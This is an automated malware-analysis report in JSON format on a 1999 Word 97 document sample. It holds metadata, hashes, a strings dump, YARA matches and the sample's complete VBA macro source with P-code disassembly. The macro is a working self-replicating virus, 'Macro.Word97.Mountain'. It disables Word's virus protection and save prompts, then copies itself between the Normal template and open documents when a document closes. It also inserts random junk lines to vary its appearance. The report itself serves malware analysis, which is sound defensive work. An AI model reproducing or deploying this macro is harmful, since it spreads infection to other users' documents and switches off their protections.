{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"NewMacros\""
        ],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\n'mountain\nPrivate Sub Document_Close()\nDim j\n   On Error Resume Next\n   'Macro.Word97.Mountain by Duke/SMF\n   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule\n   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule\n   Options.VirusProtection = False\n   Options.ConfirmConversions = False\n   Options.SaveNormalPrompt = False\n   j = 1\n   Randomize\n   If NT.Lines(1, 1) <> \"'mountain\" Then\n      For i = 1 To AD.CountOfLines\n         NT.InsertLines j, AD.Lines(i, 1)\n         j = j + 1\n         Ex = Mid(AD.Lines(i, 1), 1, 1)\n         If Ex = Asc(\" \") Then MountainNT\n      Next\n   End If\n   If AD.Lines(1, 1) <> \"'mountain\" Then\n      For i = 1 To NT.CountOfLines\n         AD.InsertLines i, NT.Lines(i, 1)\n         j = j + 1\n         Ex = Mid(NT.Lines(i, 1), 1, 1)\n         If Ex = Asc(\" \") Then MountainAD\n      Next\n   End If\nEnd Sub\nFunction MountainNT()\n   R = Rnd\n   If R < 1 And R > 0.08 Then\n      NT.InsertLines j, \" S = \" + Chr(34) + Gener + Chr(34)\n   End If\n   If R < 0.08 And R > 0.05 Then\n      NT.InsertLines j, \" '\" + Gener\n   End If\n   If R < 0.05 And R > 0.03 Then\n      NT.InsertLines j, \"  \"\n   End If\n   If R > 0.03 Then j = j + 1\nEnd Function\nFunction MountainAD()\n   R = Rnd\n   If R < 1 And R > 0.08 Then\n      AD.InsertLines j, \" S = \" + Chr(34) + Gener + Chr(34)\n   End If\n   If R < 0.08 And R > 0.05 Then\n      AD.InsertLines j, \" '\" + Gener\n   End If\n   If R < 0.05 And R > 0.03 Then\n      AD.InsertLines j, \"  \"\n   End If\n   If R > 0.03 Then j = j + 1\nEnd Function\nFunction Gener()\n   Gener = \"\"\n   For i = 1 To Int(20 * Rnd + 1)\n      Gener = Gener + Chr(Int(128 * Rnd + 48))\n   Next\nEnd Function\n\n' Processing file: VirusShare_23884d71515811f9b189aab3cecf3491\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 1182 bytes\n' Macros/VBA/NewMacros - 9025 bytes\n' Line #0:\n' \tQuoteRem 0x0000 0x0008 \"mountain\"\n' Line #1:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #2:\n' \tDim \n' \tVarDefn j\n' Line #3:\n' \tOnError (Resume Next) \n' Line #4:\n' \tQuoteRem 0x0003 0x0021 \"Macro.Word97.Mountain by Duke/SMF\"\n' Line #5:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tSet NT \n' Line #6:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tSet AD \n' Line #7:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #8:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #9:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #10:\n' \tLitDI2 0x0001 \n' \tSt j \n' Line #11:\n' \tArgsCall Read 0x0000 \n' Line #12:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NT \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0009 \"'mountain\"\n' \tNe \n' \tIfBlock \n' Line #13:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd AD \n' \tMemLd CountOfLines \n' \tFor \n' Line #14:\n' \tLd j \n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd AD \n' \tArgsMemLd Lines 0x0002 \n' \tLd NT \n' \tArgsMemCall InsertLines 0x0002 \n' Line #15:\n' \tLd j \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt j \n' Line #16:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd AD \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsLd Mid$ 0x0003 \n' \tSt Ex \n' Line #17:\n' \tLd Ex \n' \tLitStr 0x0001 \" \"\n' \tArgsLd Asc 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tArgsCall MountainNT 0x0000 \n' \tEndIf \n' Line #18:\n' \tStartForVariable \n' \tNext \n' Line #19:\n' \tEndIfBlock \n' Line #20:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd AD \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0009 \"'mountain\"\n' \tNe \n' \tIfBlock \n' Line #21:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NT \n' \tMemLd CountOfLines \n' \tFor \n' Line #22:\n' \tLd i \n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd NT \n' \tArgsMemLd Lines 0x0002 \n' \tLd AD \n' \tArgsMemCall InsertLines 0x0002 \n' Line #23:\n' \tLd j \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt j \n' Line #24:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd NT \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsLd Mid$ 0x0003 \n' \tSt Ex \n' Line #25:\n' \tLd Ex \n' \tLitStr 0x0001 \" \"\n' \tArgsLd Asc 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tArgsCall MountainAD 0x0000 \n' \tEndIf \n' Line #26:\n' \tStartForVariable \n' \tNext \n' Line #27:\n' \tEndIfBlock \n' Line #28:\n' \tEndSub \n' Line #29:\n' \tFuncDefn (Function MountainNT())\n' Line #30:\n' \tLd Rnd \n' \tSt R \n' Line #31:\n' \tLd R \n' \tLitDI2 0x0001 \n' \tLt \n' \tLd R \n' \tLitR8 0x147B 0x47AE 0x7AE1 0x3FB4 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #32:\n' \tLd j \n' \tLitStr 0x0005 \" S = \"\n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd Gener \n' \tAdd \n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd NT \n' \tArgsMemCall InsertLines 0x0002 \n' Line #33:\n' \tEndIfBlock \n' Line #34:\n' \tLd R \n' \tLitR8 0x147B 0x47AE 0x7AE1 0x3FB4 \n' \tLt \n' \tLd R \n' \tLitR8 0x999A 0x9999 0x9999 0x3FA9 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #35:\n' \tLd j \n' \tLitStr 0x0002 \" '\"\n' \tLd Gener \n' \tAdd \n' \tLd NT \n' \tArgsMemCall InsertLines 0x0002 \n' Line #36:\n' \tEndIfBlock \n' Line #37:\n' \tLd R \n' \tLitR8 0x999A 0x9999 0x9999 0x3FA9 \n' \tLt \n' \tLd R \n' \tLitR8 0x1EB8 0xEB85 0xB851 0x3F9E \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #38:\n' \tLd j \n' \tLitStr 0x0002 \"  \"\n' \tLd NT \n' \tArgsMemCall InsertLines 0x0002 \n' Line #39:\n' \tEndIfBlock \n' Line #40:\n' \tLd R \n' \tLitR8 0x1EB8 0xEB85 0xB851 0x3F9E \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLd j \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt j \n' \tEndIf \n' Line #41:\n' \tEndFunc \n' Line #42:\n' \tFuncDefn (Function MountainAD())\n' Line #43:\n' \tLd Rnd \n' \tSt R \n' Line #44:\n' \tLd R \n' \tLitDI2 0x0001 \n' \tLt \n' \tLd R \n' \tLitR8 0x147B 0x47AE 0x7AE1 0x3FB4 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #45:\n' \tLd j \n' \tLitStr 0x0005 \" S = \"\n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd Gener \n' \tAdd \n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd AD \n' \tArgsMemCall InsertLines 0x0002 \n' Line #46:\n' \tEndIfBlock \n' Line #47:\n' \tLd R \n' \tLitR8 0x147B 0x47AE 0x7AE1 0x3FB4 \n' \tLt \n' \tLd R \n' \tLitR8 0x999A 0x9999 0x9999 0x3FA9 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #48:\n' \tLd j \n' \tLitStr 0x0002 \" '\"\n' \tLd Gener \n' \tAdd \n' \tLd AD \n' \tArgsMemCall InsertLines 0x0002 \n' Line #49:\n' \tEndIfBlock \n' Line #50:\n' \tLd R \n' \tLitR8 0x999A 0x9999 0x9999 0x3FA9 \n' \tLt \n' \tLd R \n' \tLitR8 0x1EB8 0xEB85 0xB851 0x3F9E \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #51:\n' \tLd j \n' \tLitStr 0x0002 \"  \"\n' \tLd AD \n' \tArgsMemCall InsertLines 0x0002 \n' Line #52:\n' \tEndIfBlock \n' Line #53:\n' \tLd R \n' \tLitR8 0x1EB8 0xEB85 0xB851 0x3F9E \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLd j \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt j \n' \tEndIf \n' Line #54:\n' \tEndFunc \n' Line #55:\n' \tFuncDefn (Function Gener())\n' Line #56:\n' \tLitStr 0x0000 \"\"\n' \tSt Gener \n' Line #57:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0014 \n' \tLd Rnd \n' \tMul \n' \tLitDI2 0x0001 \n' \tAdd \n' \tFnInt \n' \tFor \n' Line #58:\n' \tLd Gener \n' \tLitDI2 0x0080 \n' \tLd Rnd \n' \tMul \n' \tLitDI2 0x0030 \n' \tAdd \n' \tFnInt \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tSt Gener \n' Line #59:\n' \tStartForVariable \n' \tNext \n' Line #60:\n' \tEndFunc \n"
    },
    "filename": "VirusShare_23884d71515811f9b189aab3cecf3491",
    "filesize": 49152,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1251, Author: Duke // SMF, Template: Normal, Last Saved By: Duke // SMF, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sun May  2 11:11:00 1999, Last Saved Time/Date: Sat May  8 19:17:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "23884d71515811f9b189aab3cecf3491",
        "sha1": "77ff399dc0017339c90eb5a47a14587b9ee784f3",
        "sha256": "084d2c276c342153fc49ae86b051d3adc26d0cab219d82510f5984f3375193ff"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            ". A!",
            "bjbjWW",
            "Duke // SMF",
            "Normal",
            "Duke // SMF",
            "Microsoft Word 8.0",
            "SMF - group",
            "_PID_GUID",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            " AutoOpen ",
            "   08.05.99 Duke // SMF",
            "mountain",
            "Macro.Word97.Mountain by Duke/SMF",
            "rogr",
            "MFro@",
            ".Aut",
            "mountain",
            "'mountain",
            " S = ",
            "Gz?\t",
            " S = ",
            "Gz?\t",
            "Attribut",
            "e VB_Nam",
            "e = \"New",
            "Macros\"",
            "'mounta",
            "Priv",
            "Sub Do",
            "cument_C",
            "lose()",
            "Dim j",
            "  On Err@or Res",
            "H PNext",
            "Word97.M",
            " by Duk e/SMF",
            "t NT",
            "malTempl",
            "w.VBProj",
            "\tComp",
            "s(1).",
            "CodeModu$le",
            "@Ac0tive",
            "'@Op",
            "tions.Virus",
            "(0Fals",
            "Co nfirm",
            "Saveg'mpt",
            "]Random$iz1If",
            "s, 1)  <> \"",
            "\" The",
            "$ To ADs",
            "T.Insert1",
            "%j + &\t",
            "Mid(?@",
            "As@c(\" \")* ",
            "FEnd If",
            "=@7C=",
            "3H=<AD",
            "Funon",
            "R^Rnd",
            "R < 1 AM",
            "R > 0.08G",
            "@*Lz\" S@",
            "tChr(34)@",
            "Gener'",
            "FD)*AD**Hg*",
            "<#6*1",
            "*.0*Q",
            "** <",
            "L5\u0292Int(20 * X`N1###",
            "QH8)",
            "hd`L",
            "QH()",
            "hd`L",
            "DP]/",
            "xhX1",
            "DP]/",
            "j<L5\\",
            "Gz?]p",
            "Gz?]c\\",
            "L,?]p",
            "L<?]c\\",
            "Q?]p",
            "Q?]p\\\\~",
            "j<L5\\",
            "Gz?]p",
            "Gz?]c\\",
            "L,?]p",
            "L<?]c\\",
            "Q?]p",
            "Q?]p\\\\~",
            "j\\5<h",
            "a37347ebe",
            "b37347ebe",
            "DEST",
            "DEST",
            "WordS10",
            "VBA0",
            "Win16",
            "Win32",
            "Mac0",
            "Normal0",
            "stdole`0",
            "MSFormsC",
            "ThisDocument<0",
            "_Evaluate",
            "Office",
            "NewMacros0",
            "AutoOpen*0",
            "Document_Close7\\0",
            "NTo^0",
            "NormalTemplateq0",
            "VBProjectOh0",
            "VBComponents",
            "CodeModule",
            "AD~\\0",
            "ActiveDocument\\0",
            "Options0",
            "VirusProtectionoD0",
            "ConfirmConversions",
            "SaveNormalPrompt\u02bc0",
            "Lines0",
            "CountOfLines!\\0",
            "InsertLines0",
            "Ex&]0",
            "Asc!u0",
            "MountainNTJ0",
            "MountainAD",
            "RndR0",
            "ChrK~0",
            "Gener~0",
            "Documentj0",
            "Itemz0",
            "_B_var_NT",
            "_B_var_AD&0",
            "_B_var_i\t0",
            "_B_var_Midp0",
            "_B_var_Ex0",
            "_B_var_R",
            "_B_var_j",
            "_B_var_Chr\\;0",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WIN95\\SY",
            "STEM\\STD",
            "OLE2.TLB",
            " Autom ation",
            "MSFls",
            "E1A4",
            "51BE2-93",
            "4C-11D2-",
            "B0BD-BFF",
            "FA383DB3",
            "2.TWD#",
            "Microsof",
            "^ Ob",
            "ject Libprary",
            "F54BC2-E",
            "OE-4445p5354",
            "OIP \\VBE\\",
            "'(.E",
            "vOffic",
            "v@+D,2DF",
            "+5BFA",
            "-101B-BDE5vAAu4",
            "2H,PROGRA",
            "M FILES\\",
            "MICROSOF",
            "T OFFICE",
            "MSO97.",
            "DLLY# 8.0",
            "This",
            "Document\"",
            "NewMa",
            "a@Sr",
            "DEST",
            "ThisDocument",
            "NewMacros",
            "Normal",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WIN95\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "C:\\WIN95\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "DEST",
            "C:\\WIN95\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "DEST",
            "DEST",
            "Document",
            "Document_Close",
            "MountainNT",
            "MountainAD",
            "Gener",
            "VBA332.DLL",
            "Lines",
            "'mountain",
            "CountOfLines",
            "InsertLines",
            " S = ",
            "ThisDocument",
            "NewMacros",
            "ID=\"{2363066F-0593-11D3-B0BE-444553540000}\"",
            "Document=ThisDocume_",
            "nt/&H00000000",
            "Module=NewMacros",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"CCCEADE3B5ABB9ABB9ABB9ABB9\"",
            "DPB=\"989AF9FAFAFAFAFA\"",
            "GC=\"6466050B1DD61ED61E29\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "NewMacros=22, 22, 623, 355, Z",
            " Microsoft Word",
            "MSWordDoc",
            "Word.Document.8",
            ". A!"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.313274",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
